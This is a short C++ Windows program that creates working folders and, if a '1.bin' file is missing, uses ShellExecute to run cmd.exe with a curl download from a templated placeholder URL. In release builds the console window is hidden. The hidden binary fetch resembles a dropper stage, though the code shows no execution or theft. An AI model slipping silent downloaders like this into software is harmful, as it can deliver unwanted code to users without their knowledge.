#include<iostream>
#include<filesystem>
#include<Windows.h>
#include<shellapi.h>
namespace fs = std::filesystem;
void cmd_execute(LPCWSTR command) {
#if DEBUG
	ShellExecute(NULL, NULL, L"cmd.exe",command, NULL, SW_SHOWNORMAL);
#else
	ShellExecute(NULL, NULL, L"cmd.exe", command, NULL, SW_HIDE);
#endif
}
void download_temp() {
	cmd_execute(L"/k curl -o temp\\1.bin ##TARGET-BUILD-URL##");
}
int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow)
{
	fs::path p = fs::current_path();
	fs::create_directory(p / "temp");
	fs::create_directory(p / "bin");

	bool localinst = !fs::exists(p / "1.bin");

	if (localinst) {
		download_temp();
	}

	return 0;
}